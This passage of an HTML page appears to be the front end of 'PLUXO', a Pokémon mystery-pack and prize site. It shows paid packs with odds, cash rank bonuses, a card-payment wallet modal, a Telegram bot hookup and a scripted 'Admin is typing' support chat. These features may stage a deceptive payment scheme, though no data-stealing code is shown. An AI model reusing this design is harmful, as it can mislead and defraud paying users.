            font-size: 10px;
            color: var(--green);
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .mystery-pack-container {
                grid-template-columns: 1fr;
            }
            
            .mystery-pack-center {
                order: -1;
                padding: 20px 0;
            }
            
            .mystery-question-mark {
                font-size: 120px;
            }
        }

        @media (max-width: 768px) {
            .slogan {
                font-size: 24px;
            }

            .top-header {
                flex-wrap: wrap;
                height: auto;
                padding: 10px;
            }

            .header-center,
            .header-right {
                width: 100%;
                justify-content: center;
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- Snowflakes -->
    <div class="snowflakes" id="snowflakes"></div>

    <!-- Top Header -->
    <header class="top-header">
        <div class="logo" onclick="showPage('home')">
            PLUXO
        </div>
        <div class="header-center"></div>
<div class="header-right">
            <div class="rank-info" id="rankInfo" style="display: none;">
                <span id="userRank">RANK 1</span>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width: 0%"></div>
                </div>
                <span id="userProgress">0 / 500</span>
            </div>
            <div id="balanceDisplay" style="display:none;background:#111;border:1px solid #00ff00;padding:4px 10px;font-size:8px;color:#00ff00;font-family:'Press Start 2P',monospace;margin-right:6px;">
                $<span id="balanceAmount">0.00</span>
            </div>
            <button id="addFundsBtn" onclick="showWalletModal()" style="display:none;background:#00ff00;color:#000;border:none;padding:5px 10px;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;margin-right:8px;white-space:nowrap;">+ ADD FUNDS</button>
            <div id="userButton" style="display:none;position:relative;">
                <button onclick="toggleUserMenu()" style="background:var(--dark-gray);color:var(--green);padding:6px 12px;font-size:7px;border:2px solid var(--green);cursor:pointer;font-family:'Press Start 2P',monospace;display:flex;align-items:center;gap:6px;">
                    <span id="userDisplay">@user</span><span>â–¼</span>
                </button>
                <div id="userMenuDropdown" style="display:none;position:absolute;top:100%;right:0;background:#0d0d0d;border:2px solid var(--green);min-width:160px;z-index:5000;margin-top:4px;">
                    <div onclick="showPage('profile');toggleUserMenu();" style="padding:10px 14px;font-size:7px;color:#fff;cursor:pointer;border-bottom:1px solid #222;" onmouseover="this.style.background='#1a1a1a'" onmouseout="this.style.background='transparent'">ðŸ‘¤ Profile</div>
                    <div onclick="showWalletModal();toggleUserMenu();" style="padding:10px 14px;font-size:7px;color:#fff;cursor:pointer;border-bottom:1px solid #222;" onmouseover="this.style.background='#1a1a1a'" onmouseout="this.style.background='transparent'">ðŸ’µ Add Funds</div>
                    <div onclick="openWithdrawModal();toggleUserMenu();" style="padding:10px 14px;font-size:7px;color:#fff;cursor:pointer;border-bottom:1px solid #222;" onmouseover="this.style.background='#1a1a1a'" onmouseout="this.style.background='transparent'">ðŸ’¸ Withdraw</div>
                    <div onclick="doLogout()" style="padding:10px 14px;font-size:7px;color:#ff4444;cursor:pointer;" onmouseover="this.style.background='#1a0000'" onmouseout="this.style.background='transparent'">ðŸšª Log Out</div>
                </div>
            </div>
            <a href="#" class="get-started-btn" id="loginBtn" onclick="showLoginModal(); return false;">
                <span>â†’</span>
                <span>Get started</span>
            </a>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <!-- Home Page -->
        <div class="page active" id="page-home">
            <div class="homepage-hero">
                <div class="slogan">
                    <span class="slogan-word">COLLECT</span>
                    <span class="slogan-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></span>
                    <span class="slogan-word green">RIP</span>
                    <span class="slogan-icon">ðŸ”„</span>
                    <span class="slogan-word">REDEEM</span>
                    <span class="slogan-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></span>
                    <span class="slogan-word green">REPEAT</span>
                </div>
                <p class="hero-subtitle">
                    Experience the thrill of opening digital packs, collect cards, and redeem them for physical at anytime
                </p>
                <div class="cta-section">
                    <div class="cta-text">Start by opening your first mystery pack!</div>
                    <button class="open-pack-btn" onclick="showPage('mystery-pack')">> Open a Mystery Pack</button>
                </div>
            </div>

            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></div>
                    <div class="feature-title">Real Pack Unboxing</div>
                    <div class="feature-description">
                        Open real PokÃ©mon packs with the same thrill as opening a physical pack. Every pull is a real, redeemable card.
                    </div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon"><img src="https://i.postimg.cc/k4XLQyZL/Cartoon-school-book-emoji-expression-damask-education-expressions-408403-wh1200-removebg-preview.png" style="height:48px;width:auto;vertical-align:middle;"></div>
                    <div class="feature-title">Complete Collections</div>
                    <div class="feature-description">
                        Track progress per set. Finish collections to unlock exclusive rewards or limited-edition packs.
                    </div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">ðŸ†</div>
                    <div class="feature-title">Showcase Your Collection</div>
                    <div class="feature-description">
                        Showcase your rare pulls, completed sets, and EXP level. Your profile is your digital shelf.
                    </div>
                </div>
                <div class="feature-card">
                    <div class="coming-soon">COMING SOON</div>
                    <div class="feature-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></div>
                    <div class="feature-title">Redeem for Physical</div>
                    <div class="feature-description">
                        Every card you own exists IRL. Redeem it 1:1 anytime with shipping on demand.
                    </div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">ðŸ”„</div>
                    <div class="feature-title">Trade Seamlessly</div>
                    <div class="feature-description">
                        Swap cards instantly with other collectors on the platform. No shipping needed - unless you want it.
                    </div>
                </div>
                <div class="feature-card" onclick="showPage('mystery-pack')" style="cursor: pointer;">
                    <div class="feature-icon">?</div>
                    <div class="feature-title">Mystery Packs</div>
                    <div class="feature-description">
                        Rip mystery packs for rare cards, unique drops, and EXP boosts. Pure thrill, every time.
                    </div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">â¬†</div>
                    <div class="feature-title">Earn XP, Level Up</div>
                    <div class="feature-description">
                        Earn EXP by opening, trading, and collecting. Redeem it for packs, perks, or shipping.
                    </div>
                </div>
            </div>
        </div>

        <!-- Market Page -->
        <div class="page" id="page-market">
            <div class="market-page">
                <div class="market-header">
                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 10px;">
                        <div style="font-size: 20px; color: var(--green);">PLUXO</div>
                        <button onclick="refreshMarketplaceData()" class="filter-select" style="font-size: 8px; padding: 6px 12px; cursor: pointer;" title="Refresh marketplace data">
                            ðŸ”„ Refresh Data
                        </button>
                        <div id="dataStatus" style="font-size: 7px; color: var(--gray);"></div>
                    </div>
                    <div class="market-tabs">
                        <div class="market-tab active" onclick="switchMarketTab('cards')">Cards</div>
                        <div class="market-tab" onclick="switchMarketTab('packs')">Packs</div>
                    </div>
                    <input type="text" class="search-bar" placeholder="Search for cards" id="marketSearch" oninput="filterCards()">
                    <div class="market-filters">
                        <select class="filter-select" onchange="sortCards(this.value)">
                            <option value="high-low">Price High to Low (Market Value)</option>
                            <option value="low-high">Price Low to High</option>
                            <option value="newest">Newest</option>
                            <option value="oldest">Oldest</option>
                        </select>
                        <div class="view-toggle">
                            <div class="view-icon" onclick="changeView('list')" title="List view">â˜°</div>
                            <div class="view-icon" onclick="changeView('grid')" title="Grid view">âŠž</div>
                            <div class="view-icon active" onclick="changeView('compact')" title="Compact view">â˜</div>
                        </div>
                        <button class="filter-select">Filters</button>
                    </div>
                </div>
                <div class="cards-grid" id="marketCards">
                    <!-- Cards will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Packs Page -->
        <div class="page" id="page-packs">
            <div class="market-page">
                <div class="market-header">
                    <input type="text" class="search-bar" placeholder="Search for packs" id="packSearch" oninput="filterPacks()">
                    <div class="market-filters">
                        <select class="filter-select" onchange="sortPacks(this.value)">
                            <option value="low-high">Price Low to High (Listed Price)</option>
                            <option value="high-low">Price High to Low</option>
                            <option value="newest">Newest</option>
                        </select>
                        <div class="view-toggle">
                            <div class="view-icon" onclick="changePackView('list')" title="List view">â˜°</div>
                            <div class="view-icon" onclick="changePackView('grid')" title="Grid view">âŠž</div>
                            <div class="view-icon active" onclick="changePackView('compact')" title="Compact view">â˜</div>
                        </div>
                        <button class="filter-select">Filters</button>
                    </div>
                </div>
                <div class="packs-grid" id="packsGrid">
                    <!-- Packs will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Expansions Page -->
        <div class="page" id="page-expansions">
            <div class="expansions-header">
                <h1 class="expansions-title">Expansions</h1>
                <div class="language-selector">
                    <button class="lang-btn active">English</button>
                    <button class="lang-btn">Japanese</button>
                </div>
                <input type="text" class="search-bar" placeholder="Search expansions...">
            </div>
            <div class="series-filters">
                <div class="series-filter active">All Series</div>
                <div class="series-filter">Mega Evolution</div>
                <div class="series-filter">Scarlet & Violet</div>
                <div class="series-filter">Other</div>
                <div class="series-filter">Sword & Shield</div>
                <div class="series-filter">Black & White</div>
                <div class="series-filter">Sun & Moon</div>
                <div class="series-filter">XY</div>
                <div class="series-filter">HeartGold & SoulSilver</div>
                <div class="series-filter">Platinum</div>
                <div class="series-filter">POP</div>
                <div class="series-filter">Diamond & Pearl</div>
            </div>
            <div class="expansions-grid" id="expansionsGrid">
                <!-- Expansions will be dynamically added -->
            </div>
        </div>

        <!-- Mystery Pack Page -->
        <div class="page" id="page-mystery-pack">
            <div class="mystery-pack-page">
                <div class="mystery-pack-container">
                    <!-- Left Column -->
                    <div class="mystery-pack-left">
                        <div class="mystery-pack-info">
                            <h1 class="mystery-pack-title">Mystery Packs</h1>
                            <p class="mystery-pack-description">
                                Each Mystery Pack contains 3 Pokemon packs you can open on our platform. Not happy with your pulls? Sell it back for 85% of its fair market value or list it on our marketplace! Our buyback offers expire after 48 hours.
                            </p>
                            
                            <div class="odds-section">
                                <div class="odds-header">
                                    <span class="odds-title">Odds</span>
                                    <span class="expected-value">Expected Value: $52</span>
                                </div>
                                <div class="odds-table">
                                    <div class="odds-row">
                                        <span class="odds-range">$5-$50</span>
                                        <span class="odds-percent">59%</span>
                                    </div>
                                    <div class="odds-row">
                                        <span class="odds-range">$50-$75</span>
                                        <span class="odds-percent">23%</span>
                                    </div>
                                    <div class="odds-row">
                                        <span class="odds-range">$75-$100</span>
                                        <span class="odds-percent">12%</span>
                                    </div>
                                    <div class="odds-row">
                                        <span class="odds-range">$100-$150</span>
                                        <span class="odds-percent">5%</span>
                                    </div>
                                    <div class="odds-row">
                                        <span class="odds-range">$150-$400</span>
                                        <span class="odds-percent">1%</span>
                                    </div>
                                    <div class="odds-row">
                                        <span class="odds-range">$400+</span>
                                        <span class="odds-percent">0.1%</span>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>

                    <!-- Center Column -->
                    <div class="mystery-pack-center">
                        <div class="mystery-question-mark">?</div>
                    </div>

                    <!-- Right Column -->
                    <div class="mystery-pack-right">
                        <div class="purchase-section">
                            <h2 class="purchase-title">Purchase a pack.</h2>
                            <div class="price-input-group">
                                <label>Price per pack</label>
                                <div class="price-display">$25.00</div>
                            </div>
                            <div class="quantity-input-group">
                                <label>Quantity</label>
                                <div class="quantity-controls">
                                    <button class="quantity-btn" onclick="adjustQuantity(-1)">-</button>
                                    <input type="number" id="packQuantity" value="1" min="1" class="quantity-input" onchange="validateQuantity()">
                                    <button class="quantity-btn" onclick="adjustQuantity(1)">+</button>
                                </div>
                            </div>
                            <button class="purchase-btn" id="purchasePackBtn" onclick="purchaseMysteryPack()">Purchase Pack</button>
                            <div id="purchaseLoginMsg" style="display:none;text-align:center;font-size:7px;color:#ff4444;margin-top:8px;">Login required to purchase</div>
                        </div>

                        <div class="chase-packs-section" style="margin-bottom:16px;">
                            <h2 class="chase-packs-title" style="margin-bottom:8px;">Rank Rewards</h2>
                            <p class="chase-packs-subtitle">Earn 50 EXP per pack. Rank up to unlock cash bonuses.</p>
                            <div style="display:flex;flex-direction:column;gap:6px;">
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 2</span><span style="color:#00ff00;">$5 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 3</span><span style="color:#00ff00;">$10 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 4</span><span style="color:#00ff00;">$15 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 5</span><span style="color:#ffd700;">$20 Bonus + Title</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 6</span><span style="color:#00ff00;">$25 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 7</span><span style="color:#00ff00;">$30 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 8</span><span style="color:#00ff00;">$40 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#0a1a0a;border:1px solid #1a3a1a;">
                                    <span style="color:#888;">RANK 9</span><span style="color:#00ff00;">$50 Bonus</span>
                                </div>
                                <div style="display:flex;justify-content:space-between;font-size:7px;padding:6px 8px;background:#1a0a00;border:1px solid #ffd70044;">
                                    <span style="color:#ffd700;">RANK 10</span><span style="color:#ffd700;">$100 Bonus + ELITE ðŸ‘‘</span>
                                </div>
                            </div>
                        </div>

                        <div class="chase-packs-section">
                            <h2 class="chase-packs-title">Prizes</h2>
                            <p class="chase-packs-subtitle">What you could win from mystery packs.</p>
                            <div class="chase-packs-grid" id="chasePacksGrid"></div>
                            <div style="margin-top:16px;padding:12px;background:var(--black);border:1px solid var(--green);font-size:7px;color:var(--green);line-height:1.8;text-align:center;">
                                ðŸ’° Any item not wanted can be exchanged for cash value
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Store Page -->
        <div class="page" id="page-store">
            <div class="store-hero">
                <h1 class="store-title">PLUXO STORE</h1>
            </div>
            <div class="store-featured">
                <div class="featured-item">
                    <div class="featured-image"></div>
                    <div class="featured-title">?</div>
                    <div class="featured-title">Mystery packs are live!</div>
                    <div class="featured-description">
                        Get 3 different packs for $50. Get up to $2000 worth of packs!
                    </div>
                </div>
                <div class="featured-item">
                    <div class="featured-image"></div>
                    <div class="featured-title">Phantasmal Flames</div>
                    <div class="featured-description">Featured Set</div>
                </div>
            </div>
            <div class="market-page">
                <div class="market-header">
                    <input type="text" class="search-bar" placeholder="Search for packs" id="storeSearch" oninput="filterStorePacks()">
                    <select class="filter-select">
                        <option>Default</option>
                        <option>Price Low to High</option>
                        <option>Price High to Low</option>
                    </select>
                </div>
                <div class="packs-grid" id="storePacks">
                    <!-- Store packs will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Collection Page -->
        <div class="page" id="page-collection">
            <div class="market-page">
                <div class="market-header" style="flex-direction:column;align-items:flex-start;gap:10px;padding:20px;">
                    <div style="display:flex;align-items:center;justify-content:space-between;width:100%;flex-wrap:wrap;gap:8px;">
                        <h1 style="font-size:18px;color:var(--green);">ðŸ† Saved Prizes</h1>
                        <button onclick="showWalletModal()" style="background:#00ff00;color:#000;border:none;padding:8px 14px;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;">+ ADD FUNDS</button>
                    </div>
                    <div id="savedPrizesStats" style="display:flex;gap:20px;font-size:7px;color:#aaa;flex-wrap:wrap;"></div>
                </div>
                <div id="savedPrizesGrid" style="padding:16px;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px;">
                    <!-- Saved prizes rendered here -->
                </div>
            </div>
        </div>

        <!-- Wishlist Page -->
        <div class="page" id="page-wishlist">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">My Wishlist</h1>
                    <input type="text" class="search-bar" placeholder="Search wishlist..." id="wishlistSearch" oninput="filterWishlist()">
                </div>
                <div class="cards-grid" id="wishlistGrid">
                    <!-- Wishlist cards will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Statistics Page -->
        <div class="page" id="page-stats">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">Statistics</h1>
                </div>
                <div id="statsContainer">
                    <!-- Stats will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Pack History Page -->
        <div class="page" id="page-pack-history">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">Pack History</h1>
                </div>
                <div id="packHistoryList">
                    <!-- Pack history will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Achievements Page -->
        <div class="page" id="page-achievements">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">Achievements</h1>
                    <div style="font-size: 10px; color: var(--gray);" id="achievementsCount">
                        Loading...
                    </div>
                </div>
                <div class="features-grid" id="achievementsGrid">
                    <!-- Achievements will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Leaderboard Page -->
        <div class="page" id="page-leaderboard">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">Leaderboard</h1>
                    <div class="leaderboard-tabs">
                        <button class="market-tab active" onclick="switchLeaderboardTab('value')">Collection Value</button>
                        <button class="market-tab" onclick="switchLeaderboardTab('packs')">Packs Opened</button>
                        <button class="market-tab" onclick="switchLeaderboardTab('cards')">Total Cards</button>
                    </div>
                </div>
                <div id="leaderboardList">
                    <!-- Leaderboard will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Pack Builder Page -->
        <div class="page" id="page-pack-builder">
            <div class="market-page">
                <div class="market-header">
                    <h1 style="font-size: 24px; color: var(--green);">Pack Builder</h1>
                </div>
                <div id="packBuilderContainer">
                    <!-- Pack builder will be dynamically added -->
                </div>
            </div>
        </div>

        <!-- Profile Page -->
        <div class="page" id="page-profile">
            <div class="market-page">
                <div class="profile-header">
                    <div class="profile-actions header-actions" style="position:absolute;top:16px;right:16px;display:flex;flex-direction:column;gap:8px;align-items:flex-end;">
                        <button class="modal-btn" onclick="openWithdrawModal()" style="font-size:7px;padding:8px 14px;">ðŸ’¸ Withdraw</button>
                        <button id="musicToggle" class="modal-btn music-toggle" onclick="toggleMusic()">MUSIC: ON</button>
                    </div>
                    <div class="profile-avatar" id="profileAvatar"><img src="https://i.postimg.cc/KYsC5TyH/OIP-15-removebg-preview.png" style="height:48px;width:auto;vertical-align:middle;"></div>
                    <div class="profile-info">
                        <h1 class="profile-username" id="profileUsername">
                            <script>
                                (function(){var u=JSON.parse(localStorage.getItem('currentUser')||'null');document.write(u?'@'+u.username:'Login to view profile');})();
                            </script>
                        </h1>
                        <div style="color:var(--gray);font-size:7px;margin-bottom:4px;" id="profileEmail">
                            <script>
                                (function(){var u=JSON.parse(localStorage.getItem('currentUser')||'null');if(u&&u.email)document.write(u.email);})();
                            </script>
                        </div>
                        <div class="profile-stats">
                            <div class="profile-stat">
                                <span class="profile-stat-value" id="profileStatBalance">$0.00</span>
                                <span class="profile-stat-label">Balance</span>
                            </div>
                            <div class="profile-stat">
                                <span class="profile-stat-value" id="profileStatPacks">0</span>
                                <span class="profile-stat-label">Packs</span>
                            </div>
                            <div class="profile-stat">
                                <span class="profile-stat-value" id="profileStatWinnings">$0.00</span>
                                <span class="profile-stat-label">Winnings</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="profile-content">
                    <div class="profile-section">
                        <h2>Recent Activity</h2>
                        <div id="profileActivity"></div>
                    </div>
                    <div class="profile-section">
                        <h2>Top Cards</h2>
                        <div class="cards-grid" id="profileTopCards"></div>
                    </div>
                    <div class="profile-section full">
                        <h2>Support Chat</h2>
                        <div class="support-demo">
                            <div class="support-demo-title">Example Support Conversation (Demo)</div>
                        <div class="support-demo-item">
                            <div class="support-demo-role">dripzer</div>
                            <div class="support-demo-text">yo my spin froze on the last pack</div>
                            <div class="support-demo-role admin">Admin</div>
                            <div class="support-demo-text">Got you. If the spin didnâ€™t complete Iâ€™ll add a credit. Tell me the time and pack.</div>
                        </div>
                        <div class="support-demo-item">
                            <div class="support-demo-role">markx2</div>
                            <div class="support-demo-text">withdraw still pending for new account</div>
                            <div class="support-demo-role admin">Admin</div>
                            <div class="support-demo-text">New users can take a little longer. Typical window is 2â€“7 business days.</div>
                        </div>
                        <div class="support-demo-item">
                            <div class="support-demo-role">walkdowncat</div>
                            <div class="support-demo-text">chose shipping on a prize, do i get tracking?</div>
                            <div class="support-demo-role admin">Admin</div>
                            <div class="support-demo-text">Yes. Once it ships youâ€™ll see a tracking update. Delivery requires signature.</div>
                        </div>
                        </div>
                        <div class="chat-header">
                            <div id="chatTyping" class="chat-typing">Admin is typing<span class="dots"></span></div>
                        </div>
                        <div id="chatMessages" class="chat-messages"></div>
                        <div class="chat-input">
                            <input id="chatInput" type="text" placeholder="Type your message..." maxlength="240" onkeydown="if(event.key==='Enter'){handleSupportSend();}">
                            <button id="chatSend" type="button" onclick="handleSupportSend()">SEND</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Bottom Navigation -->
    <nav class="bottom-nav">
        <div class="nav-item" onclick="showPage('home')">
            <div class="nav-icon"><img src="https://i.postimg.cc/15t5mG3r/2841869-middle-removebg-preview.png" style="height:48px;width:auto;vertical-align:middle;"></div>
            <div>Home</div>
        </div>
        <div class="nav-item" onclick="showPage('packs')">
            <div class="nav-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:48px;width:auto;vertical-align:middle;"></div>
            <div>Packs</div>
        </div>
        <div class="nav-item" onclick="showPage('collection')">
            <div class="nav-icon"><img src="https://i.postimg.cc/k4XLQyZL/Cartoon-school-book-emoji-expression-damask-education-expressions-408403-wh1200-removebg-preview.png" style="height:48px;width:auto;vertical-align:middle;"></div>
            <div>Saved Prizes</div>
        </div>
        <div class="nav-item" onclick="showPage('profile')">
            <div class="nav-icon"><img src="https://i.postimg.cc/KYsC5TyH/OIP-15-removebg-preview.png" style="height:48px;width:auto;vertical-align:middle;"></div>
            <div>Profile</div>
        </div>
    </nav>

<!-- Login Modal -->
    <!-- Telegram Bot Setup Banner -->
    <div id="tgSetupBanner" style="display:none;position:fixed;bottom:80px;left:50%;transform:translateX(-50%);z-index:9999;background:#1a1a1a;border:2px solid #00ff00;padding:16px 20px;font-family:'Press Start 2P',monospace;font-size:8px;color:#fff;max-width:360px;width:92%;text-align:center;">
        <div style="color:#00ff00;margin-bottom:10px;">âš¡ TELEGRAM BOT SETUP</div>
        <div style="color:#aaa;margin-bottom:10px;line-height:1.8;font-size:7px;">
            1. Open Telegram â†’ message <b style="color:#fff;">@userinfobot</b><br>
            2. It replies with your numeric Chat ID<br>
            3. Paste it below and click Connect
        </div>
        <input id="tgChatIdInput" type="text" placeholder="Your numeric Chat ID" 
            style="width:100%;background:#000;color:#00ff00;border:2px solid #00ff00;padding:8px;font-family:'Press Start 2P',monospace;font-size:8px;margin-bottom:8px;outline:none;text-align:center;">
        <div id="tgSetupError" style="display:none;color:#ff4444;font-size:7px;margin-bottom:8px;line-height:1.6;"></div>
        <button id="tgSetupBtn" onclick="tgRunSetup()" style="background:#00ff00;color:#000;border:none;padding:10px 18px;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:100%;margin-bottom:8px;">Connect Bot</button>
        <button onclick="document.getElementById('tgSetupBanner').style.display='none'" style="background:transparent;color:#555;border:1px solid #333;padding:6px 12px;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;">Dismiss</button>
    </div>

    <!-- Admin Panel -->
    <!-- Admin panel removed â€” bot runs on Railway 24/7 -->

    <div class="modal-overlay" id="loginModal">
        <div class="modal login-modal" id="loginModalInner">
            <button class="modal-close" onclick="closeModal('loginModal')">Ã—</button>
            <div class="modal-title">PLUXO</div>
            <div class="modal-description">Sign in to your account</div>
            <div class="modal-buttons">
                <button class="modal-btn" onclick="showEmailLogin()">
                    <span>âœ‰</span>
                    <span>Login with Email</span>
                </button>
                <button class="modal-btn secondary" style="margin-top: 10px;" onclick="showEmailSignUp()">
                    <span>+</span>
                    <span>Create Account</span>
                </button>
            </div>
            <div style="text-align: center; margin-top: 20px; font-size: 6px; color: var(--gray);">
                By continuing, you confirm that you have read and agree to <span style="color: var(--green);">Terms</span> and <span style="color: var(--green);">Privacy Policy</span>
            </div>
        </div>
    </div>

    <!-- Withdrawal Multi-Step Modal -->
    <div class="modal-overlay" id="withdrawModal">
        <div class="modal" id="withdrawModalInner" style="max-width:460px;max-height:85vh;overflow-y:auto;"></div>
    </div>

    <!-- Admin Message Popup -->
    <div id="adminMsgPopup" style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:30000;background:#0d0d0d;border:2px solid #00ff00;padding:24px;font-family:'Press Start 2P',monospace;max-width:340px;width:90%;text-align:center;">
        <div style="color:#00ff00;font-size:9px;margin-bottom:10px;">ðŸ“¨ MESSAGE FROM SUPPORT</div>
        <div id="adminMsgText" style="font-size:8px;color:#fff;line-height:1.8;margin-bottom:16px;"></div>
        <button onclick="document.getElementById('adminMsgPopup').style.display='none'" style="background:#00ff00;color:#000;border:none;padding:10px 20px;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:100%;">OK</button>
    </div>

    <!-- Wallet Modal -->
    <div class="modal-overlay" id="walletModal">
        <div class="modal" id="walletModalInner" style="max-width:440px;max-height:88vh;overflow-y:auto;"></div>
    </div>

    <!-- Payment Success Popup -->
    <div id="paySuccessPopup" style="display:none;position:fixed;inset:0;z-index:25000;background:rgba(0,0,0,0.92);flex-direction:column;align-items:center;justify-content:center;font-family:'Press Start 2P',monospace;">
        <div id="paySuccessInner" style="text-align:center;animation:paySuccessAnim 0.6s cubic-bezier(0.34,1.56,0.64,1);">
            <div id="paySuccessIcon" style="font-size:64px;margin-bottom:16px;"></div>
            <div id="paySuccessTitle" style="font-size:14px;margin-bottom:8px;"></div>
            <div id="paySuccessAmount" style="font-size:28px;color:#00ff00;margin-bottom:8px;"></div>
            <div id="paySuccessSub" style="font-size:7px;color:#888;margin-bottom:24px;line-height:1.8;"></div>
            <button onclick="closePaySuccess()" style="background:#00ff00;color:#000;border:none;padding:14px 0;font-family:'Press Start 2P',monospace;font-size:9px;cursor:pointer;width:220px;">CONTINUE</button>
        </div>
        <canvas id="confettiCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:25001;"></canvas>
    </div>

    <style>
        @keyframes paySuccessAnim { from{opacity:0;transform:scale(0.5) translateY(40px);} to{opacity:1;transform:scale(1) translateY(0);} }
        @keyframes slideInStep { from{opacity:0;transform:translateX(30px);} to{opacity:1;transform:translateX(0);} }
        @keyframes shakeErr { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-8px)} 40%,80%{transform:translateX(8px)} }
        @keyframes processingPulse { 0%,100%{opacity:1;transform:scale(1);} 50%{opacity:0.5;transform:scale(0.95);} }
        .pay-step { animation: slideInStep 0.3s ease; }
        .pay-input {
            width:100%;background:#000;color:#fff;border:1px solid #333;
            padding:11px;font-family:'Press Start 2P',monospace;font-size:8px;
            outline:none;margin-bottom:10px;transition:border-color 0.2s;box-sizing:border-box;
        }
        .pay-input:focus { border-color:#00ff00; }
        .pay-label { font-size:6px;color:#666;margin-bottom:5px;letter-spacing:1px; }
        .amt-btn { background:#111;color:#888;border:1px solid #333;padding:10px;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;flex:1;transition:all 0.15s; }
        .amt-btn:hover,.amt-btn.active { background:#001a00;color:#00ff00;border-color:#00ff00; }
        .pay-card-preview {
            background:linear-gradient(135deg,#0a1a0a,#1a2a1a);
            border:1px solid #00ff00;border-radius:8px;padding:16px 18px;
            margin-bottom:14px;position:relative;overflow:hidden;
        }
    </style>

    <script>
        // Snowflake generation
        function createSnowflakes() {
            const snowflakes = document.getElementById('snowflakes');
            const flakes = ['â„', 'â…', 'â†'];
            
            for (let i = 0; i < 50; i++) {
                const flake = document.createElement('div');
                flake.className = 'snowflake';
                flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
                flake.style.left = Math.random() * 100 + '%';
                flake.style.animationDuration = (Math.random() * 3 + 2) + 's';
                flake.style.opacity = Math.random();
                snowflakes.appendChild(flake);
            }
        }

        // Page navigation
        function showPage(pageName) {
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            
            const targetPage = document.getElementById(`page-${pageName}`);
            if (targetPage) {
                targetPage.classList.add('active');
                
                // Load data when page becomes active
                if (pageName === 'mystery-pack') {
                    generateRecentPulls('global');
                    generateChasePacks();
                } else if (pageName === 'market') {
                    generateMarketCards();
                } else if (pageName === 'packs') {
                    generatePacks();
                } else if (pageName === 'collection') {
                    renderSavedPrizes();
